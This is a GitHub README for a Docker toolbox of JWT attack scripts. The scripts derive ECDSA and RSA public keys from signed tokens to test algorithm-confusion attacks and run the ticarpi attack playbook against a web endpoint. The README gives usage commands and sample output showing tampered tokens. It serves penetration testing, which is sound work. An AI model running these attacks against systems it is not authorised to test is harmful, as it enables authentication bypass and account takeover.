# 💻 JWT toolbox

[![Build and deploy the toolbox image](https://github.com/righettod/toolbox-jwt/actions/workflows/build_docker_image.yml/badge.svg?branch=main)](https://github.com/righettod/toolbox-jwt/actions/workflows/build_docker_image.yml) ![MadeWitVSCode](https://img.shields.io/static/v1?label=Made%20with&message=VisualStudio%20Code&color=blue&?style=for-the-badge&logo=visualstudio) ![MadeWithDocker](https://img.shields.io/static/v1?label=Made%20with&message=Docker&color=blue&?style=for-the-badge&logo=docker) ![AutomatedWith](https://img.shields.io/static/v1?label=Automated%20with&message=GitHub%20Actions&color=blue&?style=for-the-badge&logo=github)

## 🎯 Description

The goal of this image is to provide a ready-to-use toolbox with different scripts having for the objective to perform different kinds of attacks against [JWT](https://jwt.io/) tokens.

💡 Indeed, some existing scripts require specific runtime/package/etc. so the goal is to have a quick ready-to-use sandbox to execute them to obtain crafted JWT token.

## 📦 Build

Use the following set of command to build the docker image of the toolbox:

```bash
git clone https://github.com/righettod/toolbox-jwt.git
cd toolbox-jwt
docker build . -t righettod/toolbox-jwt
```

💡 The image is build every week and pushed to the GitHub image repository. You can retrieve it with the following command:

`docker pull ghcr.io/righettod/toolbox-jwt:main`

## 🤔 Usage

Use the following command to create a container of the toolbox:

```bash
docker run --rm -it ghcr.io/righettod/toolbox-jwt:main /bin/bash
# From here, use one of the provided script...
```

## 📋 Content

### Script 'generate-jwt-ecdsa-derivated-public-keys.rb'

> **Note**: Author of the script is the [PentesterLab](https://blog.pentesterlab.com/exploring-algorithm-confusion-attacks-on-jwt-exploiting-ecdsa-23f7ff83390f) team ❤.

Script to generate derivated **ECDSA** public keys from a JWT ECDSA signed token. To goal is to test exposure to algorithm confusion attacks on token using ECDSA key pair.

💻 Usage:

`ruby generate-jwt-ecdsa-derivated-public-keys.rb "JWT_ECDSA_SIGNED_TOKEN"`

💻 Example:

```bash
# Once in the bash of the toolbox
ruby generate-jwt-ecdsa-derivated-public-keys.rb "eyJ0eXA..."
[+] Key:
-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE6mWiWnAqBhDvAWwyiM7+STTq0Csi
spjd61v7AtpvgKMyOHVMxMQ6yyrjVKp/syHteGSeltXdfEQ0Dlv0tkZQqg==
-----END PUBLIC KEY-----
[+] Key:
-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE7zuf4prcB/qW4AL7d20LSb99Zwwl
hRSCnHTrpnHUnXoqZVAGwCNpYSJf1rpjZQocwwEL016+OuspiQ67N9EDoA==
-----END PUBLIC KEY-----
```

### Script 'generate-jwt-rsa-derivated-public-keys.sh'

> **Note**: Author of the tool used by the script is the [Silent Signal](https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/) team ❤.

Script to generate derivated **RSA** public keys from a JWT RSA signed token. To goal is to test exposure to algorithm confusion attacks on token using RSA key pair.

💻 Usage:

`bash generate-jwt-rsa-derivated-public-keys.sh "JWT_RSA_SIGNED_TOKEN_1" "JWT_RSA_SIGNED_TOKEN_2"`

💻 Example:

```bash
# Once in the bash of the toolbox
bash generate-jwt-rsa-derivated-public-keys.sh "eyJ0eXA..." "eyJ0eXA..."
[*] GCD:  0x6b
[*] GCD:  0xd7b8aa3...
[+] Found n with multiplier 1  :
 0xd7b8aa...
[+] Written to d7b8aa3fc15ccb45_65537_x509.pem
[+] Tampered JWT: b'eyJ0eXAiOiJ...'
[+] Written to d7b8aa3fc15ccb45_65537_pkcs1.pem
[+] Tampered JWT: b'eyJ0eXAiOiH...'
==============================================================
Here are your JWT's once again for your copypasting pleasure
==============================================================
eyJ0eXAiOiJKV1Qi...
eyJ0eXAiOiJKV1Qj...
```

### Script 'apply-ticarpi-jwt-attack-playbook.sh'

Script to test an web service against the [TICARPI attack playbook](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology).

💻 Usage:

`bash apply-ticarpi-jwt-attack-playbook.sh "ENDPOINT_FULL_URL" "CANARY_WORD" "VALID_JWT_TOKEN"`

📍 The **canary word** is a word that must be present in the HTTP response when the JWT token is accepted (case-sensitive).

💻 Example:

```bash
# Once in the bash of the toolbox
bash apply-ticarpi-jwt-attack-playbook.sh "https://righettod.eu/api/profile" "righettod" "eyJ0eXA..."
...
```

## 🤝 Sources & credits

* <https://blog.pentesterlab.com/exploring-algorithm-confusion-attacks-on-jwt-exploiting-ecdsa-23f7ff83390f>
* <https://github.com/silentsignal/rsa_sign2n>
* <https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/>
* <https://github.com/ticarpi/jwt_tool>
* <https://github.com/ticarpi/jwt_tool/wiki>
